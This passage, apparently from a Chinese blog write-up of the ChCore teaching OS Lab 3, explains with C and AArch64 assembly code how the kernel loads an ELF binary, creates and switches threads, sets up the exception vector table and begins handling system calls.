<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* process_create_root: create the root process */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">process_create_root</span><span class="params">(<span class="type">char</span> *bin_name)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">process</span> *<span class="title">root_process</span>;</span></span><br><span class="line">    <span class="type">int</span> thread_cap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">root_thread</span>;</span></span><br><span class="line">    <span class="type">char</span> *binary = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    ret = ramdisk_read_file(bin_name, &amp;binary); <span class="comment">// 从磁盘载入 ELF 文件</span></span><br><span class="line">    root_process = process_create(); <span class="comment">// 创建进程结构</span></span><br><span class="line">    <span class="comment">// 创建主线程</span></span><br><span class="line">    thread_cap = thread_create_main(root_process, ROOT_THREAD_STACK_BASE,</span><br><span class="line">                    ROOT_THREAD_STACK_SIZE,</span><br><span class="line">                    ROOT_THREAD_PRIO, TYPE_ROOT,</span><br><span class="line">                    <span class="number">0</span>, binary, bin_name);</span><br><span class="line">    <span class="comment">// 获取线程对象，对引用计数器恢复原值</span></span><br><span class="line">    root_thread = obj_get(root_process, thread_cap, TYPE_THREAD);</span><br><span class="line">    obj_put(root_thread);</span><br><span class="line">    current_thread = root_thread;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* main_thread: the first thread in a process (process).</span></span><br><span class="line"><span class="comment">* So, thread_create_main needs to load the code/data as well.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">thread_create_main</span><span class="params">(<span class="keyword">struct</span> process *process, u64 stack_base,</span></span><br><span class="line"><span class="params">            u64 stack_size, u32 prio, u32 type, s32 aff,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="type">char</span> *bin_start, <span class="type">char</span> *bin_name)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret, thread_cap, stack_pmo_cap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">thread</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pmobject</span> *<span class="title">stack_pmo</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vmspace</span> *<span class="title">init_vmspace</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">process_metadata</span> <span class="title">meta</span>;</span></span><br><span class="line">    u64 <span class="built_in">stack</span>;</span><br><span class="line">    u64 pc;</span><br><span class="line"></span><br><span class="line">    init_vmspace = obj_get(process, VMSPACE_OBJ_ID, TYPE_VMSPACE);</span><br><span class="line">    obj_put(init_vmspace);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为初始线程分配并设置用户栈</span></span><br><span class="line">    stack_pmo = obj_alloc(TYPE_PMO, <span class="keyword">sizeof</span>(*stack_pmo));</span><br><span class="line">    pmo_init(stack_pmo, PMO_DATA, stack_size, <span class="number">0</span>);</span><br><span class="line">    stack_pmo_cap = cap_alloc(process, stack_pmo, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将物理栈帧挂载到 ROOT_THREAD_STACK 虚拟空间下</span></span><br><span class="line">    ret = vmspace_map_range(init_vmspace, stack_base, stack_size,</span><br><span class="line">                VMR_READ | VMR_WRITE, stack_pmo);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建线程对象</span></span><br><span class="line">    thread = obj_alloc(TYPE_THREAD, <span class="keyword">sizeof</span>(*thread));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 栈从高向低生长，切换栈指针</span></span><br><span class="line">    <span class="built_in">stack</span> = stack_base + stack_size;</span><br><span class="line">    <span class="comment">// 加载 ELF 文件</span></span><br><span class="line">    pc = load_binary(process, init_vmspace, bin_start, &amp;meta);</span><br><span class="line">    <span class="comment">// 部分环境变量入栈</span></span><br><span class="line">    prepare_env((<span class="type">char</span> *)phys_to_virt(stack_pmo-&gt;start) + stack_size,</span><br><span class="line">            <span class="built_in">stack</span>, &amp;meta, bin_name);</span><br><span class="line">    <span class="built_in">stack</span> -= ENV_SIZE_ON_STACK;</span><br><span class="line">    <span class="comment">// 初始化线程</span></span><br><span class="line">    ret = thread_init(thread, process, <span class="built_in">stack</span>, pc, prio, type, aff);</span><br><span class="line">    <span class="comment">// 将线程挂在到进程</span></span><br><span class="line">    thread_cap = cap_alloc(process, thread, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* L1 icache &amp; dcache have no coherence */</span></span><br><span class="line">    flush_idcache();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// return thread;</span></span><br><span class="line">    <span class="keyword">return</span> thread_cap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Load-binary"><a href="#Load-binary" class="headerlink" title="Load binary"></a>Load binary</h3><p>Load_binary 主要是将内存中的 ELF 文件进行解析并将其加载到用户内存空间</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* load binary into some process (process) */</span></span><br><span class="line"><span class="type">static</span> u64 <span class="title function_">load_binary</span><span class="params">(<span class="keyword">struct</span> process *process,</span></span><br><span class="line"><span class="params">		       <span class="keyword">struct</span> vmspace *vmspace,</span></span><br><span class="line"><span class="params">		       <span class="type">const</span> <span class="type">char</span> *bin, <span class="keyword">struct</span> process_metadata *metadata)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">elf_file</span> *<span class="title">elf</span>;</span></span><br><span class="line">    <span class="type">vmr_prop_t</span> flags;</span><br><span class="line">    <span class="type">int</span> i, r;</span><br><span class="line">    <span class="type">size_t</span> seg_sz, seg_map_sz;</span><br><span class="line">    u64 p_vaddr;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> *pmo_cap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pmobject</span> *<span class="title">pmo</span>;</span></span><br><span class="line">    u64 ret;</span><br><span class="line">    <span class="comment">// 将 bin 纯字节流文件解析成 elf_file 格式</span></span><br><span class="line">    elf = elf_parse_file(bin);</span><br><span class="line">    pmo_cap = kmalloc(elf-&gt;header.e_phnum * <span class="keyword">sizeof</span>(*pmo_cap));</span><br><span class="line">    <span class="comment">// 加载 ELF 二进制文件中的 each program segment</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; elf-&gt;header.e_phnum; ++i) &#123;</span><br><span class="line">        pmo_cap[i] = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (elf-&gt;p_headers[i].p_type == PT_LOAD) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * Lab3: Your code here</span></span><br><span class="line"><span class="comment">            * 准备好 pmo_init 和 vmspace_map_range 需要的参数</span></span><br><span class="line"><span class="comment">            * pmo_init 为 PMO 分配所需的物理内存</span></span><br><span class="line"><span class="comment">            * vmspace_map_range 将 pmo 映射到指定的虚拟内存地址</span></span><br><span class="line"><span class="comment">            * 获取当前段的大小和虚拟地址</span></span><br><span class="line"><span class="comment">            *</span></span><br><span class="line"><span class="comment">            * HINT: 建议使用 seg_sz 和 p_vaddr 变量作为原始数据，seg_map_sz 作为页对其段大小</span></span><br><span class="line"><span class="comment">            * Take care of the page alignment when allocating</span></span><br><span class="line"><span class="comment">            * and mapping physical memory.</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            seg_sz = elf-&gt;p_headers[i].p_memsz;</span><br><span class="line">            p_vaddr = elf-&gt;p_headers[i].p_vaddr;</span><br><span class="line">            u64 vaddr_start = ROUND_DOWN(p_vaddr, PAGE_SIZE);</span><br><span class="line">            u64 vaddr_end = ROUND_UP(p_vaddr+seg_sz, PAGE_SIZE);</span><br><span class="line">            seg_map_sz = vaddr_end - vaddr_start;</span><br><span class="line">            </span><br><span class="line">            pmo = obj_alloc(TYPE_PMO, <span class="keyword">sizeof</span>(*pmo));</span><br><span class="line">            <span class="keyword">if</span> (!pmo) &#123;</span><br><span class="line">                r = -ENOMEM;</span><br><span class="line">                <span class="keyword">goto</span> out_free_cap;</span><br><span class="line">            &#125;</span><br><span class="line">            pmo_init(pmo, PMO_DATA, seg_map_sz, <span class="number">0</span>);</span><br><span class="line">            pmo_cap[i] = cap_alloc(process, pmo, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (pmo_cap[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                r = pmo_cap[i];</span><br><span class="line">                <span class="keyword">goto</span> out_free_obj;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                * Lab3: Your code here</span></span><br><span class="line"><span class="comment">                * You should copy data from the elf into the physical memory in pmo.</span></span><br><span class="line"><span class="comment">                * The physical address of a pmo can be get from pmo-&gt;start.</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            u64 start_offset = p_vaddr - vaddr_start;</span><br><span class="line">            <span class="type">char</span> *pmo_start = (<span class="type">char</span> *) phys_to_virt(pmo-&gt;start) + start_offset;</span><br><span class="line">            <span class="type">char</span> * seg_start = bin + elf-&gt;p_headers[i].p_offset;</span><br><span class="line">            u64 copy_size = elf-&gt;p_headers[i].p_filesz;</span><br><span class="line">            <span class="keyword">for</span> (u64 i = <span class="number">0</span>; i &lt; copy_size; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                pmo_start[i] = seg_start[i];</span><br><span class="line">            &#125;</span><br><span class="line">            flags = PFLAGS2VMRFLAGS(elf-&gt;p_headers[i].p_flags);</span><br><span class="line"></span><br><span class="line">            ret = vmspace_map_range(vmspace,</span><br><span class="line">                        ROUND_DOWN(p_vaddr, PAGE_SIZE),</span><br><span class="line">                        seg_map_sz, flags, pmo);</span><br><span class="line"></span><br><span class="line">            BUG_ON(ret != <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* return binary metadata */</span></span><br><span class="line">    <span class="keyword">if</span> (metadata != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        metadata-&gt;phdr_addr = elf-&gt;p_headers[<span class="number">0</span>].p_vaddr +</span><br><span class="line">            elf-&gt;header.e_phoff;</span><br><span class="line">        metadata-&gt;phentsize = elf-&gt;header.e_phentsize;</span><br><span class="line">        metadata-&gt;phnum = elf-&gt;header.e_phnum;</span><br><span class="line">        metadata-&gt;flags = elf-&gt;header.e_flags;</span><br><span class="line">        metadata-&gt;entry = elf-&gt;header.e_entry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kfree((<span class="type">void</span> *)bin);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* PC: the entry point */</span></span><br><span class="line">    <span class="keyword">return</span> elf-&gt;header.e_entry;</span><br><span class="line">out_free_obj:</span><br><span class="line">    obj_free(pmo);</span><br><span class="line">out_free_cap:</span><br><span class="line">    <span class="keyword">for</span> (--i; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pmo_cap[i] != <span class="number">0</span>)</span><br><span class="line">            cap_free(process, pmo_cap[i]);</span><br><span class="line">    &#125;</span><br><span class="line">out_fail:</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="线程初始化"><a href="#线程初始化" class="headerlink" title="线程初始化"></a>线程初始化</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">thread_init</span><span class="params">(<span class="keyword">struct</span> thread *thread, <span class="keyword">struct</span> process *process,</span></span><br><span class="line"><span class="params">		u64 <span class="built_in">stack</span>, u64 pc, u32 prio, u32 type, s32 aff)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 重置线程的进程及虚拟空间对象引用</span></span><br><span class="line">    thread-&gt;process = obj_get(process, PROCESS_OBJ_ID, TYPE_PROCESS);</span><br><span class="line">    thread-&gt;vmspace = obj_get(process, VMSPACE_OBJ_ID, TYPE_VMSPACE);</span><br><span class="line">    obj_put(thread-&gt;process);</span><br><span class="line">    obj_put(thread-&gt;vmspace);</span><br><span class="line">    <span class="comment">// 构建线程的上下文，对于线程来说，被当作内核栈使用</span></span><br><span class="line">    thread-&gt;thread_ctx = create_thread_ctx();</span><br><span class="line">    <span class="comment">// 初始化线程上下文</span></span><br><span class="line">    init_thread_ctx(thread, <span class="built_in">stack</span>, pc, prio, type, aff);</span><br><span class="line">    <span class="comment">// 将线程添加到进程的线程链表中</span></span><br><span class="line">    list_add(&amp;thread-&gt;node, &amp;process-&gt;thread_list);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回的线程上下文结构地址在分配的栈底</span></span><br><span class="line"><span class="comment">/*  ----  0 ~ kernel stack</span></span><br><span class="line"><span class="comment"> * |    | |</span></span><br><span class="line"><span class="comment"> * |    | |</span></span><br><span class="line"><span class="comment"> * |....| |</span></span><br><span class="line"><span class="comment"> * |    | | -&gt; DEFAULT KERNEL STACK SIZE </span></span><br><span class="line"><span class="comment"> * |----| |</span></span><br><span class="line"><span class="comment"> * |    | | ---&gt; struct thread_ctx</span></span><br><span class="line"><span class="comment"> * |----| | ~ kernel stack + DEFAULT KERNEL STACK SIZE</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> thread_ctx *<span class="title function_">create_thread_ctx</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *kernel_stack;</span><br><span class="line"></span><br><span class="line">    kernel_stack = kzalloc(DEFAULT_KERNEL_STACK_SZ);</span><br><span class="line">    <span class="keyword">return</span> kernel_stack + DEFAULT_KERNEL_STACK_SZ -</span><br><span class="line">        <span class="keyword">sizeof</span>(<span class="keyword">struct</span> thread_ctx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 初始化线程上下文</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_thread_ctx</span><span class="params">(<span class="keyword">struct</span> thread *thread, u64 <span class="built_in">stack</span>, u64 func, u32 prio,</span></span><br><span class="line"><span class="params">		     u32 type, s32 aff)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Fill the context of the thread */</span></span><br><span class="line">    thread-&gt;thread_ctx-&gt;ec.reg[SP_EL0] = <span class="built_in">stack</span>;</span><br><span class="line">    thread-&gt;thread_ctx-&gt;ec.reg[ELR_EL1] = func;</span><br><span class="line">    thread-&gt;thread_ctx-&gt;ec.reg[SPSR_EL1] = SPSR_EL1_USER;</span><br><span class="line">	<span class="comment">/* Set thread type */</span></span><br><span class="line">	thread-&gt;thread_ctx-&gt;type = type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="切换线程上下文"><a href="#切换线程上下文" class="headerlink" title="切换线程上下文"></a>切换线程上下文</h3><p>切换线程上下文：</p>
<ul>
<li>切换虚拟内存空间，即切换进程独有的 <code>TTBR0_EL1</code> 寄存器内容</li>
<li>返回当前线程的上下文<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 切换虚拟内存空间以及架构相关内容</span></span><br><span class="line"><span class="comment"> * 返回应当被设置到栈指针寄存器的上下文指针</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">u64 <span class="title function_">switch_context</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">target_thread</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_ctx</span> *<span class="title">target_ctx</span>;</span></span><br><span class="line"></span><br><span class="line">	target_thread = current_thread;</span><br><span class="line">	BUG_ON(!target_thread);</span><br><span class="line">	BUG_ON(!target_thread-&gt;thread_ctx);</span><br><span class="line"></span><br><span class="line">	target_ctx = target_thread-&gt;thread_ctx;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* These 3 types of thread do not have vmspace */</span></span><br><span class="line">	<span class="keyword">if</span> (target_thread-&gt;thread_ctx-&gt;type != TYPE_IDLE &amp;&amp;</span><br><span class="line">	    target_thread-&gt;thread_ctx-&gt;type != TYPE_KERNEL &amp;&amp;</span><br><span class="line">	    target_thread-&gt;thread_ctx-&gt;type != TYPE_TESTS) &#123;</span><br><span class="line">		BUG_ON(!target_thread-&gt;vmspace);</span><br><span class="line">		switch_thread_vmspace_to(target_thread);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Lab3: Your code here</span></span><br><span class="line"><span class="comment">	 * Return the correct value in order to make eret_to_thread work correctly</span></span><br><span class="line"><span class="comment">	 * in main.c</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> (u64) target_ctx-&gt;ec.reg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
返回的值由 <code>eret_to_thread</code> 使用<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BEGIN_FUNC(eret_to_thread)</span><br><span class="line">	mov	sp, x0</span><br><span class="line">	exception_exit</span><br><span class="line"><span class="title function_">END_FUNC</span><span class="params">(eret_to_thread)</span></span><br><span class="line"></span><br><span class="line">.macro	exception_exit</span><br><span class="line">	ldp	x11, x12, [sp, #16 * 16]</span><br><span class="line">	ldp	x30, x10, [sp, #16 * 15] </span><br><span class="line">	msr	sp_el0, x10</span><br><span class="line">	msr	elr_el1, x11</span><br><span class="line">	msr	spsr_el1, x12</span><br><span class="line">	ldp	x0, x1, [sp, #16 * 0]</span><br><span class="line">	ldp	x2, x3, [sp, #16 * 1]</span><br><span class="line">	ldp	x4, x5, [sp, #16 * 2]</span><br><span class="line">	ldp	x6, x7, [sp, #16 * 3]</span><br><span class="line">	ldp	x8, x9, [sp, #16 * 4]</span><br><span class="line">	ldp	x10, x11, [sp, #16 * 5]</span><br><span class="line">	ldp	x12, x13, [sp, #16 * 6]</span><br><span class="line">	ldp	x14, x15, [sp, #16 * 7]</span><br><span class="line">	ldp	x16, x17, [sp, #16 * 8]</span><br><span class="line">	ldp	x18, x19, [sp, #16 * 9]</span><br><span class="line">	ldp	x20, x21, [sp, #16 * 10]</span><br><span class="line">	ldp	x22, x23, [sp, #16 * 11]</span><br><span class="line">	ldp	x24, x25, [sp, #16 * 12]</span><br><span class="line">	ldp	x26, x27, [sp, #16 * 13]</span><br><span class="line">	ldp	x28, x29, [sp, #16 * 14]</span><br><span class="line">	add	sp, sp, #ARCH_EXEC_CONT_SIZE</span><br><span class="line">	eret</span><br><span class="line">.endm</span><br></pre></td></tr></table></figure>
可以看到 <code>eret_to_thread</code> 仅仅将 栈指针 设定为 线程的上下文寄存器栈，随后调用 <code>exception_exit</code>，这个过程将数据全部读取到寄存器中，随后调用 <code>eret</code> 指令进行线程跳转</li>
</ul>
<h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><h2 id="AArch64-异常"><a href="#AArch64-异常" class="headerlink" title="AArch64 异常"></a>AArch64 异常</h2><p>异常可以理解为低权限级运行出现问题，请求高权限级帮助的事件，一般分为同步异常和异步异常</p>
<ul>
<li>同步异常一般是程序运行过程中通过执行指令产生的异常，异常返回地址同异常发生原因存在关联性，如访问地址出错或者调用 svc hvc smc 请求服务</li>
<li>异步异常一般是与当前执行的指令无关的异常，如外部事件进入导致现有执行流中断 IRQ FIQ</li>
</ul>
<h2 id="异常向量表"><a href="#异常向量表" class="headerlink" title="异常向量表"></a>异常向量表</h2><p>AArch64 能够处理异常的代码称之为异常向量，在异常向量表中可以通过索引的方式进行快速处理异常<br>对每个异常级别都拥有其独立的异常向量表，表地址存储在 <code>VBAR_EL1</code> <code>VBAR_EL2</code> <code>VBAR_EL3</code></p>
<p>直接根据向量表结构及后续函数名修改即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.align	<span class="number">11</span></span><br><span class="line">EXPORT(el1_vector)</span><br><span class="line">    exception_entry sync_el1t</span><br><span class="line">    exception_entry irq_el1t</span><br><span class="line">    exception_entry fiq_el1t</span><br><span class="line">    exception_entry error_el1t</span><br><span class="line"></span><br><span class="line">    exception_entry sync_el1h</span><br><span class="line">    exception_entry irq_el1h</span><br><span class="line">    exception_entry fiq_el1h</span><br><span class="line">    exception_entry error_el1h</span><br><span class="line"></span><br><span class="line">    exception_entry sync_el0_64</span><br><span class="line">    exception_entry irq_el0_64</span><br><span class="line">    exception_entry fiq_el0_64</span><br><span class="line">    exception_entry error_el0_64</span><br><span class="line"></span><br><span class="line">    exception_entry sync_el0_32</span><br><span class="line">    exception_entry irq_el0_32</span><br><span class="line">    exception_entry fiq_el0_32</span><br><span class="line">    exception_entry error_el0_32</span><br></pre></td></tr></table></figure>
<h2 id="异常向量表初始化"><a href="#异常向量表初始化" class="headerlink" title="异常向量表初始化"></a>异常向量表初始化</h2><p>通过函数 <code>set_exception_vector</code> 启动异常向量表，其主要工作是将 <code>el1_vector</code> 的地址传到 <code>vbar_el1</code> 寄存器中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BEGIN_FUNC(set_exception_vector)</span><br><span class="line">	adr	x0, el1_vector</span><br><span class="line">	msr	vbar_el1, x0</span><br><span class="line">	ret</span><br><span class="line"><span class="title function_">END_FUNC</span><span class="params">(set_exception_vector)</span></span><br></pre></td></tr></table></figure>

<p>ChCore 通过在 <code>main.c</code> 函数中调用 <code>exception_init</code> 进行完成</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">exception_init_per_cpu</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Lab3: Your code here</span></span><br><span class="line"><span class="comment">    * Setup the exception vector with the asm function written in exception.S</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    set_exception_vector();</span><br><span class="line">    disable_irq();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exception_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	exception_init_per_cpu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="异常处理流程"><a href="#异常处理流程" class="headerlink" title="异常处理流程"></a>异常处理流程</h2><p>在 AArch64 处理器运行用户线程执行代码时，遇到指令集未定义指令，发生未定义指令异常</p>
<ol>
<li>将异常原因放入 ESR_EL1 寄存器中，返回地址放入 ELR_EL1 中 </li>
<li>处理器从 VBAR_EL1 获取异常处理向量表基址，根据异常处理向量表规则选择 VBAR_EL1 + 0x400 条目</li>
<li>切换特权级到 EL1, 包含 SP_EL1、PSTATE状态保存</li>
<li>处理器执行异常处理代码</li>
</ol>
<p>简单的代码流程是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取基地址及对应的处理代码</span></span><br><span class="line">.align	<span class="number">11</span></span><br><span class="line">EXPORT(el1_vector)</span><br><span class="line">    ...</span><br><span class="line">    exception_entry sync_el0_64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据简单跳转宏判断</span></span><br><span class="line">.macro	exception_entry	label</span><br><span class="line">    <span class="comment">/* Each entry should be 0x80 aligned */</span></span><br><span class="line">    .align	<span class="number">7</span></span><br><span class="line">    b	\label</span><br><span class="line">.endm</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳转到 \sync_el0_64</span></span><br><span class="line">sync_el0_64:</span><br><span class="line">    <span class="comment">/* Since we cannot touch x0-x7, we need some extra work here */</span></span><br><span class="line">    <span class="comment">// 保存状态</span></span><br><span class="line">    exception_enter</span><br><span class="line">    <span class="comment">// 异常处理</span></span><br><span class="line">    mrs	x25, esr_el1</span><br><span class="line">    lsr	x24, x25, #ESR_EL1_EC_SHIFT</span><br><span class="line">    cmp	x24, #ESR_EL1_EC_SVC_64</span><br><span class="line">    <span class="comment">// 是否为系统调用</span></span><br><span class="line">    b.eq	el0_syscall</span><br><span class="line">    <span class="comment">/* Not supported exception */</span></span><br><span class="line">    mov	x0, SYNC_EL0_64 </span><br><span class="line">    mrs	x1, esr_el1</span><br><span class="line">    mrs	x2, elr_el1</span><br><span class="line">    bl	handle_entry_c</span><br><span class="line">    <span class="comment">// 恢复状态</span></span><br><span class="line">    exception_exit</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳转到 C 代码 handle_entry_c 进行处理</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">handle_entry_c</span><span class="params">(<span class="type">int</span> type, u64 esr, u64 address)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ec: exception class */</span></span><br><span class="line">    u32 esr_ec = GET_ESR_EL1_EC(esr);</span><br><span class="line"></span><br><span class="line">    kdebug</span><br><span class="line">        (<span class="string">&quot;Interrupt type: %d, ESR: 0x%lx, Fault address: 0x%lx, EC 0b%b\n&quot;</span>,</span><br><span class="line">            type, esr, address, esr_ec);</span><br><span class="line">    <span class="comment">/* Dispatch exception according to EC */</span></span><br><span class="line">    <span class="keyword">switch</span> (esr_ec) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * Lab3: Your code here</span></span><br><span class="line"><span class="comment">            * Handle exceptions as required in the lab document. Checking exception codes in</span></span><br><span class="line"><span class="comment">            * esr.h may help.</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">        <span class="keyword">case</span> ESR_EL1_EC_UNKNOWN:</span><br><span class="line">            kinfo(<span class="string">&quot;%s\n&quot;</span>, UNKNOWN);</span><br><span class="line">            sys_exit(-ESUPPORT);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        kdebug(<span class="string">&quot;Unsupported Exception ESR %lx\n&quot;</span>, esr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="系统调用与缺页异常"><a href="#系统调用与缺页异常" class="headerlink" title="系统调用与缺页异常"></a>系统调用与缺页异常</h1><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>系统调用是用户需要操作系统的服务而使用的一种方式，使用 <code>SVC</code> 指令进行自主触发<br>在触发异常后</p>
<ol>
<li>对异常原因 <code>ESR_EL1</code> 进行操作, 检测是否为 <code>SVC</code> 系统调用，如果是则跳转到 <code>el0_syscall</code> 函数</li>
<li>保存寄存器状态，根据 <code>x8</code> 寄存器中存储的系统调用号跳转到系统调用表 <code>syscall_table</code> 中<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sync_el0_64:</span><br><span class="line">    <span class="comment">/* Since we cannot touch x0-x7, we need some extra work here */</span></span><br><span class="line">    exception_enter</span><br><span class="line">    mrs	x25, esr_el1</span><br><span class="line">    lsr	x24, x25, #ESR_EL1_EC_SHIFT</span><br><span class="line">    cmp	x24, #ESR_EL1_EC_SVC_64</span><br><span class="line">    b.eq	el0_syscall</span><br><span class="line">    <span class="comment">/* Not supported exception */</span></span><br><span class="line">    mov	x0, SYNC_EL0_64 </span><br><span class="line">    mrs	x1, esr_el1</span><br><span class="line">    mrs	x2, elr_el1</span><br><span class="line">    bl	handle_entry_c</span><br><span class="line">    exception_exit</span><br><span class="line"></span><br><span class="line">el0_syscall:</span><br><span class="line">    sub	sp, sp, #<span class="number">16</span> * <span class="number">8</span></span><br><span class="line">    stp	x0, x1, [sp, #<span class="number">16</span> * <span class="number">0</span>]</span><br><span class="line">    stp	x2, x3, [sp, #<span class="number">16</span> * <span class="number">1</span>]</span><br><span class="line">    stp	x4, x5, [sp, #<span class="number">16</span> * <span class="number">2</span>]</span><br><span class="line">    stp	x6, x7, [sp, #<span class="number">16</span> * <span class="number">3</span>]</span><br><span class="line">    stp	x8, x9, [sp, #<span class="number">16</span> * <span class="number">4</span>]</span><br><span class="line">    stp	x10, x11, [sp, #<span class="number">16</span> * <span class="number">5</span>]</span><br><span class="line">    stp	x12, x13, [sp, #<span class="number">16</span> * <span class="number">6</span>]</span><br><span class="line">    stp	x14, x15, [sp, #<span class="number">16</span> * <span class="number">7</span>]</span><br><span class="line">    ldp	x0, x1, [sp, #<span class="number">16</span> * <span class="number">0</span>]</span><br><span class="line">    ldp	x2, x3, [sp, #<span class="number">16</span> * <span class="number">1</span>]</span><br><span class="line">    ldp	x4, x5, [sp, #<span class="number">16</span> * <span class="number">2</span>]</span><br><span class="line">    ldp	x6, x7, [sp, #<span class="number">16</span> * <span class="number">3</span>]</span><br><span class="line">    ldp	x8, x9, [sp, #<span class="number">16</span> * <span class="number">4</span>]</span><br><span class="line">    ldp	x10, x11, [sp, #<span class="number">16</span> * <span class="number">5</span>]</span><br><span class="line">    ldp	x12, x13, [sp, #<span class="number">16</span> * <span class="number">6</span>]</span><br><span class="line">    ldp	x14, x15, [sp, #<span class="number">16</span> * <span class="number">7</span>]</span><br><span class="line">    add	sp, sp, #<span class="number">16</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    